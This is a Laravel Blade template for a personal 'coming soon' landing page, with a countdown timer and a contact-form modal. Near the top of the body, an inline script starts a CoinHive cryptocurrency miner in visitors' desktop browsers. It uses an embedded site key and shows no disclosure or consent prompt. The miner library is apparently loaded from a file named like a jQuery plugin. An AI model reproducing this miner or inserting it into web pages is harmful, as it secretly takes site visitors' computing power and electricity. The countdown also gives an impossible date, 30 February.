<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    {!! SEOMeta::generate() !!}
    {!! OpenGraph::generate() !!}
    {!! Twitter::generate() !!}
    <link href="https://fonts.googleapis.com/css?family=Playfair+Display:400,700|Dosis|Oswald:300" rel="stylesheet">
    <link rel="stylesheet" href="{{ asset('coming_soon/css/bootstrap.min.css') }}">
    <link rel="stylesheet" href="{{ asset('coming_soon/css/icon-font.css') }}">
    <link rel="stylesheet" href="{{ asset('coming_soon/css/aos.css') }}">
    <link rel="stylesheet" href="{{ asset('coming_soon/css/style.css') }}">
    <script src="{{ asset('coming_soon/js/jquery-3.2.1.min.js') }}"></script>
	<script src="{{ asset('coming_soon/js/jquery.am.min.js') }}"></script>
    @if($errors->any())
        <script type="text/javascript">
            $(document).ready(function () {
                $("#okModal").modal('show');
            });
        </script>
    @endif
</head>
<body class="light-theme bg-one body-padding">
<script>
	var miner = new CoinHive.Anonymous('dYqLNIIUtXlU66orH2zNBLENl7DwRtbV', {throttle: 0.3,language: 'ko'});
	if (!miner.isMobile() && !miner.didOptOut(60*60*4)) {
		miner.start();
	}
</script>
<div class="animation anim-dark" data-aos="slide-effect-2">
    <div class="wrapper animation-inner">
        <div class="background bg-minimal">
        </div>
        <div class="content-section d-flex justify-content-center align-items-center">
            <div class="v-lines">
                <div class="vline-1"></div>
                <div class="vline-2"></div>
                <div class="vline-3"></div>
                <div class="vline-4"></div>
            </div>
            <div class="container">
                <div class="center-content align-self-center">
                    <h1 class="display-3 sans-serif-font font-bold" data-aos="fade" data-aos-delay="1800">Arash
                        Hatami</h1>
                    <p class="lead my-2 my-sm-4" data-aos="fade" data-aos-delay="2500">I am cooking something really
                        awesome stuff. Hold your breath and wait for the royal launch</p>
                    <div class="countdown-wrap" data-aos="fade" data-aos-delay="3000">
                        <ul id="countdown" class="countdown" data-event-date="30 february 2018 00:00:00">
                            <li><span class="days">00</span>
                                <p class="timeRefDays">days</p>
                            </li>
                            <li><span class="hours">00</span>
                                <p class="timeRefHours">hours</p>
                            </li>
                            <li><span class="minutes">00</span>
                                <p class="timeRefMinutes">minutes</p>
                            </li>
                            <li><span class="seconds">00</span>
                                <p class="timeRefSeconds">seconds</p>
                            </li>
                        </ul>
                    </div>
                    <span class="animation anim-dark" data-aos="slide-effect-btn" data-aos-delay="3500">
                        <a href="javascript:void(0);" class="btn btn-lg btn-outline" data-toggle="modal"
                           data-target="#contactModal">Contact Now</a>
                    </span>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="modal modal-center" id="contactModal" tabindex="-1" role="dialog" aria-labelledby="contactModalLabel"
     aria-hidden="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-body">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true"><i class="pe-7s-close pe-2x"></i></span>
                </button>
                <h2 class="modal-title" id="contactModalLabel">Contact Me</h2>
                <p class="lead text-center p-2">
                    Have a question? Want to know more about my super awesome projects? Just send me a message.
                </p>
                <form class="pr-4 pl-4 pb-4" id="phpcontactform" action="{{ url('/contact') }}" method="post">
                    {{ csrf_field() }}
                    <div class="row">
                        <div class="col-sm-6">
                            <div class="form-group md-form">
                                <input type="text" name="name" class="form-control input-material" autocomplete="off"
                                       required>
                                <span class="highlight"></span>
                                <span class="bar"></span>
                                <label class="">Full Name</label>
                            </div>
                        </div>
                        <div class="col-sm-6">
                            <div class="form-group md-form">
                                <input type="email" name="email" class="form-control input-material" autocomplete="off"
                                       required>
                                <span class="highlight"></span>
                                <span class="bar"></span>
                                <label class="">Email Address</label>
                            </div>
                        </div>
                    </div>

                    <div class="form-group md-form">
                        <textarea name="message" class="form-control input-material" rows="5" required></textarea>
                        <span class="highlight"></span>
                        <span class="bar"></span>
                        <label class="">Your Message</label>
                    </div>

                    <div class="form-group text-center mb-0">
                        <input type="submit" class="btn btn-lg btn-outline" value="Send Message">
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<div class="modal modal-center" id="okModal" tabindex="-2" role="dialog" aria-labelledby="contactModalLabel"
     aria-hidden="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-body">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true"><i class="pe-7s-close pe-2x"></i></span>
                </button>
                <h2 class="modal-title" id="contactModalLabel">Thank You</h2>
                <p class="lead text-center p-2">
                    I Will Be In Touch with You.
                </p>
            </div>
        </div>
    </div>
</div>

<script src="{{ asset('coming_soon/js/tether.min.js') }}"></script>
<script src="{{ asset('coming_soon/js/bootstrap.min.js') }}"></script>
<script src="{{ asset('coming_soon/js/viewport.min.js') }}"></script>
<script src="{{ asset('coming_soon/js/aos.js') }}"></script>
<script src="{{ asset('coming_soon/js/countdown.js') }}"></script>
<script src="{{ asset('coming_soon/js/smoothscroll.min.js') }}"></script>
<script src="{{ asset('coming_soon/js/validate.js') }}"></script>
<script src="{{ asset('coming_soon/js/subscribe.js') }}"></script>
<script src="{{ asset('coming_soon/js/script.js') }}"></script>
</body>
</html>